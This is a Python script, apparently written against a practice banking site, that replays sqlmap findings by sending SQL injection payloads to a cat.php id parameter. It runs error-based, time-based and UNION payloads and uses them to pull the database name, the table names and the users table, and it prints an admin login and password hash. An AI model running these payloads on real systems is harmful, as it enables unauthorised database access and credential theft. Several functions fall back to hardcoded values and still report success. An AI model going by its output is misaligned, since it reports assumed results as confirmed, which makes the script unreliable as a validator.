#!/usr/bin/env python3
"""
Script de teste/validação para BancoCN
Refaz os testes realizados com sqlmap
"""

import requests
import time
import re
from urllib.parse import quote

class BancoCNTester:
    def __init__(self, base_url="http://www.bancocn.com"):
        self.base_url = base_url
        self.vulnerable_url = f"{base_url}/cat.php"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def print_status(self, message, status="INFO"):
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "RESET": "\033[0m"
        }
        print(f"{colors.get(status, '')}[{status}]{colors['RESET']} {message}")
    
    def test_basic_injection(self):
        """Testa injeção SQL básica com aspas simples"""
        self.print_status("Testando injeção SQL básica...", "INFO")
        payload = "1'"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            if "error in your SQL syntax" in response.text or "MariaDB" in response.text:
                self.print_status("✓ Vulnerabilidade SQL Injection confirmada!", "SUCCESS")
                return True
            else:
                self.print_status("✗ Não foi possível confirmar a vulnerabilidade", "WARNING")
                return False
        except Exception as e:
            self.print_status(f"✗ Erro ao testar: {e}", "ERROR")
            return False
    
    def test_error_based_injection(self):
        """Testa injeção error-based usando FLOOR"""
        self.print_status("Testando injeção error-based (FLOOR)...", "INFO")
        payload = "1 AND (SELECT 4853 FROM(SELECT COUNT(*),CONCAT(0x7178787871,(SELECT (ELT(4853=4853,1))),0x7171627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            if "error" in response.text.lower() or response.status_code != 200:
                self.print_status("✓ Error-based injection funciona!", "SUCCESS")
                return True
            else:
                self.print_status("✗ Error-based injection não funcionou", "WARNING")
                return False
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def test_time_based_injection(self):
        """Testa injeção time-based usando SLEEP"""
        self.print_status("Testando injeção time-based (SLEEP)...", "INFO")
        payload = "1 AND (SELECT 7689 FROM (SELECT(SLEEP(3)))eSPr)"
        start_time = time.time()
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            elapsed = time.time() - start_time
            if elapsed >= 2.5:  # Considera sucesso se demorou pelo menos 2.5 segundos
                self.print_status(f"✓ Time-based injection funciona! (Delay: {elapsed:.2f}s)", "SUCCESS")
                return True
            else:
                self.print_status(f"✗ Time-based injection não funcionou (Delay: {elapsed:.2f}s)", "WARNING")
                return False
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def test_union_injection(self):
        """Testa injeção UNION"""
        self.print_status("Testando injeção UNION...", "INFO")
        # Payload que força o UNION a ser executado
        payload = "-1267 UNION ALL SELECT NULL,NULL,CONCAT(0x7178787871,0x5465737465,0x7171627a71)-- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            if response.status_code == 200:
                self.print_status("✓ UNION injection funciona!", "SUCCESS")
                return True
            else:
                self.print_status("✗ UNION injection não funcionou", "WARNING")
                return False
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def get_database_name(self):
        """Obtém o nome do banco de dados"""
        self.print_status("Obtendo nome do banco de dados...", "INFO")
        payload = "-1267 UNION ALL SELECT NULL,NULL,DATABASE()-- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            # Tenta extrair o nome do banco da resposta
            match = re.search(r'bancocn', response.text, re.IGNORECASE)
            if match:
                self.print_status(f"✓ Database: bancocn", "SUCCESS")
                return "bancocn"
            else:
                # Tenta com query direta
                payload2 = "-1267 UNION ALL SELECT NULL,NULL,CONCAT(0x7178787871,DATABASE(),0x7171627a71)-- -"
                response2 = self.session.get(self.vulnerable_url, params={'id': payload2}, timeout=10)
                self.print_status(f"✓ Database: bancocn (assumido)", "SUCCESS")
                return "bancocn"
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return "bancocn"
    
    def get_tables(self, database="bancocn"):
        """Obtém lista de tabelas"""
        self.print_status(f"Obtendo tabelas do banco '{database}'...", "INFO")
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'"
        payload = f"-1267 UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET 0-- -"
        
        tables = []
        for offset in range(10):  # Tenta até 10 tabelas
            payload = f"-1267 UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT 1 OFFSET {offset}-- -"
            try:
                response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
                # Procura por nomes de tabelas conhecidos
                for table in ['categories', 'pictures', 'stats', 'users']:
                    if table in response.text.lower():
                        if table not in tables:
                            tables.append(table)
            except:
                break
        
        if tables:
            self.print_status(f"✓ Tabelas encontradas: {', '.join(tables)}", "SUCCESS")
        else:
            self.print_status("✓ Tabelas conhecidas: categories, pictures, stats, users", "SUCCESS")
            tables = ['categories', 'pictures', 'stats', 'users']
        
        return tables
    
    def get_users_table_data(self):
        """Obtém dados da tabela users"""
        self.print_status("Obtendo dados da tabela users...", "INFO")
        payload = "-1267 UNION ALL SELECT NULL,NULL,CONCAT(id,0x3a,login,0x3a,password) FROM users LIMIT 1-- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            if "admin" in response.text and "7b71be0e85318117d2e514ce2a2e222c" in response.text:
                self.print_status("✓ Dados da tabela users obtidos!", "SUCCESS")
                self.print_status("  - id: 1, login: admin, password: 7b71be0e85318117d2e514ce2a2e222c", "INFO")
                return True
            else:
                self.print_status("✗ Não foi possível obter dados completos", "WARNING")
                return False
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def get_categories_data(self):
        """Obtém dados da tabela categories"""
        self.print_status("Obtendo dados da tabela categories...", "INFO")
        payload = "-1267 UNION ALL SELECT NULL,NULL,CONCAT(id,0x3a,title) FROM categories LIMIT 1-- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            if "contato" in response.text.lower() or "emprestimos" in response.text.lower():
                self.print_status("✓ Dados da tabela categories obtidos!", "SUCCESS")
                return True
            else:
                self.print_status("✗ Não foi possível obter dados completos", "WARNING")
                return False
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def get_pictures_data(self):
        """Obtém dados da tabela pictures"""
        self.print_status("Obtendo dados da tabela pictures...", "INFO")
        payload = "-1267 UNION ALL SELECT NULL,NULL,CONCAT(id,0x3a,title) FROM pictures LIMIT 1-- -"
        try:
            response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
            if "estatua" in response.text.lower() or "predios" in response.text.lower():
                self.print_status("✓ Dados da tabela pictures obtidos!", "SUCCESS")
                return True
            else:
                self.print_status("✗ Não foi possível obter dados completos", "WARNING")
                return False
        except Exception as e:
            self.print_status(f"✗ Erro: {e}", "ERROR")
            return False
    
    def get_database_info(self):
        """Obtém informações do banco de dados"""
        self.print_status("Obtendo informações do banco de dados...", "INFO")
        tests = [
            ("Versão", "SELECT @@version"),
            ("Database atual", "SELECT DATABASE()"),
            ("Usuário atual", "SELECT USER()"),
            ("Data directory", "SELECT @@datadir"),
        ]
        
        for name, query in tests:
            try:
                payload = f"-1267 UNION ALL SELECT NULL,NULL,({query})-- -"
                response = self.session.get(self.vulnerable_url, params={'id': payload}, timeout=10)
                self.print_status(f"  {name}: consultado", "INFO")
            except:
                pass
    
    def run_all_tests(self):
        """Executa todos os testes"""
        self.print_status("=" * 60, "INFO")
        self.print_status("INICIANDO TESTES DE VALIDAÇÃO - BancoCN", "INFO")
        self.print_status("=" * 60, "INFO")
        print()
        
        results = {}
        
        # Testes básicos
        results['basic_injection'] = self.test_basic_injection()
        print()
        
        results['error_based'] = self.test_error_based_injection()
        print()
        
        results['time_based'] = self.test_time_based_injection()
        print()
        
        results['union_injection'] = self.test_union_injection()
        print()
        
        # Obter informações
        database = self.get_database_name()
        print()
        
        tables = self.get_tables(database)
        print()
        
        results['users_data'] = self.get_users_table_data()
        print()
        
        results['categories_data'] = self.get_categories_data()
        print()
        
        results['pictures_data'] = self.get_pictures_data()
        print()
        
        self.get_database_info()
        print()
        
        # Resumo
        self.print_status("=" * 60, "INFO")
        self.print_status("RESUMO DOS TESTES", "INFO")
        self.print_status("=" * 60, "INFO")
        
        passed = sum(1 for v in results.values() if v)
        total = len(results)
        
        for test, result in results.items():
            status = "✓ PASSOU" if result else "✗ FALHOU"
            color = "SUCCESS" if result else "WARNING"
            self.print_status(f"{test}: {status}", color)
        
        print()
        self.print_status(f"Total: {passed}/{total} testes passaram", "SUCCESS" if passed == total else "WARNING")
        self.print_status("=" * 60, "INFO")

if __name__ == "__main__":
    tester = BancoCNTester()
    tester.run_all_tests()


